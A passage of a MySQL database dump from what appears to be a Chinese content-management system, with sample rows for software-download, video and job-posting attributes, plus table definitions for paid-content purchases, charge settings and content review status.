INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (61,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (61,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (61,'Director','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (63,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (63,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (63,'Director','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (69,'demoUrl','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (69,'relatedLink','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (69,'softType','国产软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (69,'warrant','免费版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (69,'edition','8.3.18038.0');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (69,'system','WinXP/Win2003/Vista/Win7/Win8');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (69,'size','54.3M');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (69,'bit','32/64');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (71,'demoUrl','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (71,'system','win8/win7/vista/win2003/winxp');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (71,'size','10.9 MB');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (71,'relatedLink','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (71,'softType','国产软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (71,'edition','V5.2.7');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (71,'warrant','免费版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (71,'bit','32位');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (72,'demoUrl','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (72,'system','WinXP(SP2以上) / Vista / Win7 / Win8 / Win8.1');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (72,'size','112M');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (72,'relatedLink','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (72,'softType','国产软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (72,'edition','360杀毒V5.0.0.7092');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (72,'warrant','免费版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (72,'bit','32/64');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (100,'demoUrl','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (100,'system','win8/win7/vista/win2003/winxp');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (100,'size','298.68 MB');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (100,'relatedLink','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (100,'softType','国产软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (100,'edition','3.00.401');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (100,'warrant','免费版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (100,'bit','32/64');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (101,'demoUrl','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (101,'system','WinXP/Win2003/Vista/Win7/Win8/Win10');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (101,'size','40.4M');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (101,'relatedLink','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (101,'softType','国产软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (101,'edition','9.0.16.408');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (101,'warrant','免费版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (101,'bit','32/64');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (102,'demoUrl','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (102,'system','Win2000 WinXP Win2003 Vista Win8 Win7 Win10');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (102,'size','1.29MB');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (102,'relatedLink','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (102,'softType','国产软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (102,'edition','10.3.0.2009 官方正式版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (102,'warrant','免费版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (102,'bit','32/64');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (103,'demoUrl','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (103,'system','WinXP/Win2003/Vista/Win7/Win8/Win10');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (103,'size','37.5M');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (103,'relatedLink','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (103,'softType','国产软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (103,'edition','8.0.0.8381');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (103,'warrant','免费版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (103,'bit','32/64');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (104,'demoUrl','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (104,'system','WinXP/Win2003/Vista/Win7/Win8');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (104,'size','22.6M');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (104,'relatedLink','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (104,'softType','国产软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (104,'edition','8.13.0.0');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (104,'warrant','免费版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (104,'bit','32/64');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (105,'demoUrl','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (105,'system','WinXP/Win2003/Vista/Win7/Win8');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (105,'size','61.4M');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (105,'relatedLink','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (105,'softType','国产软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (105,'edition','2.0.0.1');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (105,'warrant','免费版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (105,'bit','32/64');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (106,'demoUrl','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (106,'system','WinXP/Win2003/Vista/Win7/Win8/Win10');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (106,'size','33.3M');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (106,'relatedLink','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (106,'softType','国产软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (106,'edition','4.3.3.27');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (106,'warrant','免费版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (106,'bit','32/64');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (107,'demoUrl','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (107,'system','Win7/Win8/Win10');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (107,'size','46.5M');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (107,'relatedLink','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (107,'softType','国产软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (107,'edition','53.0.2785.143');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (107,'warrant','免费版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (107,'bit','32/64');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (108,'demoUrl','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (108,'system','Win7/WinVista/WinXP/Win8兼容软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (108,'size','9.7M');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (108,'relatedLink','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (108,'softType','国产软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (108,'edition','8.1');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (108,'warrant','免费版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (108,'bit','32/64');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (109,'demoUrl','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (109,'system','Win2000/WinXP/Win2003/Vista/Win7/Win8/Win10');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (109,'size','32.7M');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (109,'relatedLink','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (109,'softType','国产软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (109,'edition','版本：3.7.0.0011');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (109,'warrant','免费版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (109,'bit','32/64');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (110,'demoUrl','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (110,'system','WinXP/Win2003/Vista/Win7/Win8/Win10');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (110,'size','32.5M');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (110,'relatedLink','http://');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (110,'softType','国产软件');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (110,'edition','9.15.1596.0');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (110,'warrant','免费版');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (110,'bit','32/64');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (114,'pic1','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (114,'pic2','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (114,'pic3','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (13,'pic1','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (13,'pic2','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (13,'pic3','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (7,'pic1','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (7,'pic2','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (7,'pic3','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (115,'pic1','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (115,'pic2','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (115,'pic3','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (121,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (121,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (121,'Director','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (122,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (122,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (122,'Director','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (123,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (123,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (123,'Director','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (124,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (124,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (124,'Director','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (125,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (125,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (125,'Director','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (126,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (126,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (126,'Director','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (127,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (127,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (127,'Director','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (128,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (128,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (128,'Director','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (129,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (129,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (129,'Director','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (140,'education','专科');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (140,'nature','全职');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (140,'hasmanage','不要求');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (140,'deadline','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (140,'experience','1-3年');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (140,'salary','1500-2000');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (140,'category','项目主管');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (140,'workplace','重庆');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (140,'nums','1-3人');

#
# Source for table jc_content_buy
#

CREATE TABLE `jc_content_buy` (
  `content_buy_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `order_number` varchar(50) NOT NULL DEFAULT '' COMMENT '订单号',
  `content_id` int(11) NOT NULL COMMENT '内容ID',
  `buy_user_id` int(11) DEFAULT NULL COMMENT '购买用户ID',
  `author_user_id` int(11) NOT NULL COMMENT '笔者ID',
  `charge_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '成交金额',
  `author_amount` double(11,4) NOT NULL DEFAULT '0.0000' COMMENT '笔者所得',
  `plat_amount` double(11,4) NOT NULL DEFAULT '0.0000' COMMENT '平台所得',
  `buy_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '成交时间',
  `has_paid_author` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否已经结算给作者(0未结算 1已经结算)',
  `order_num_weixin` varchar(255) DEFAULT NULL COMMENT '微信支付订单号',
  `order_num_alipay` varchar(100) DEFAULT NULL COMMENT '支付宝订单号',
  `charge_reward` tinyint(1) NOT NULL DEFAULT '1' COMMENT '模式 1收费 2打赏',
  PRIMARY KEY (`content_buy_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='收费文章购买记录';

#
# Dumping data for table jc_content_buy
#


#
# Source for table jc_content_channel
#

CREATE TABLE `jc_content_channel` (
  `channel_id` int(11) NOT NULL,
  `content_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`content_id`),
  KEY `fk_jc_channel_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容栏目关联表';

#
# Dumping data for table jc_content_channel
#

INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,11);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,12);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,14);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,23);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,27);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,28);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,29);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,30);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,32);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,33);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,36);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,37);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,39);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,111);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,112);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,113);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,130);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,131);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (75,132);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (76,2);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (76,7);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (76,13);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (76,114);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (76,115);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (76,116);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (76,117);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (76,118);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (76,119);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (76,120);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (76,141);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,53);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,55);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,57);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,59);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,61);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,63);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,121);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,122);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,123);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,124);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,125);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,126);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,127);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,128);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (77,129);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (79,43);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (79,44);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (79,45);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (79,46);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (79,47);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (79,48);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (79,49);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (79,50);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (79,51);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (79,140);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (90,69);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (90,72);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (90,102);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (90,103);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (91,71);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (91,101);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (91,105);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (91,106);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (91,107);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (91,108);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (91,109);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (91,110);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (93,100);
INSERT INTO `jc_content_channel` (`channel_id`,`content_id`) VALUES (93,104);

#
# Source for table jc_content_charge
#

CREATE TABLE `jc_content_charge` (
  `content_id` int(11) NOT NULL DEFAULT '0',
  `charge_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '收费金额',
  `total_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '已累计收费',
  `year_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '年金额',
  `month_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '月金额',
  `day_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '日金额',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '最后购买时间',
  `charge_reward` tinyint(1) NOT NULL DEFAULT '0' COMMENT '模式，1收费 2打赏',
  `reward_random_min` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '随机 最小值',
  `reward_random_max` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '随机 最大值',
  `reward_pattern` tinyint(1) NOT NULL DEFAULT '0' COMMENT '打赏模式(0随机 1固定)',
  PRIMARY KEY (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='收费内容配置';

#
# Dumping data for table jc_content_charge
#

INSERT INTO `jc_content_charge` (`content_id`,`charge_amount`,`total_amount`,`year_amount`,`month_amount`,`day_amount`,`last_buy_time`,`charge_reward`,`reward_random_min`,`reward_random_max`,`reward_pattern`) VALUES (130,0.01,0,0,0,0,NULL,1,0,0,0);

#
# Source for table jc_content_check
#

CREATE TABLE `jc_content_check` (
  `content_id` int(11) NOT NULL,
  `check_step` tinyint(4) NOT NULL DEFAULT '0' COMMENT '审核步数',
  `check_opinion` varchar(255) DEFAULT NULL COMMENT '审核意见',
  `is_rejected` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否退回',
  `reviewer` int(11) DEFAULT NULL COMMENT '终审者',
  `check_date` datetime DEFAULT NULL COMMENT '终审时间',
  PRIMARY KEY (`content_id`),
  KEY `fk_jc_content_check_user` (`reviewer`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容审核信息表';

#
# Dumping data for table jc_content_check
#

INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (2,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (7,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (11,-1,NULL,0,1,'2016-09-28 14:17:39');
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (12,-1,NULL,0,1,'2016-09-28 14:17:39');
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (13,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (14,-1,NULL,0,1,'2016-09-28 14:17:39');
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (23,-1,NULL,0,1,'2016-09-28 14:17:39');
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (27,-1,NULL,0,1,'2016-09-28 14:17:38');
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (28,-1,NULL,0,1,'2016-09-28 14:17:38');
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (29,-1,NULL,0,1,'2016-09-28 14:17:38');
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (30,-1,NULL,0,1,'2016-09-28 14:17:38');
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (32,-1,NULL,0,1,'2016-09-28 14:17:37');
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (33,-1,NULL,0,1,'2016-09-28 14:17:37');
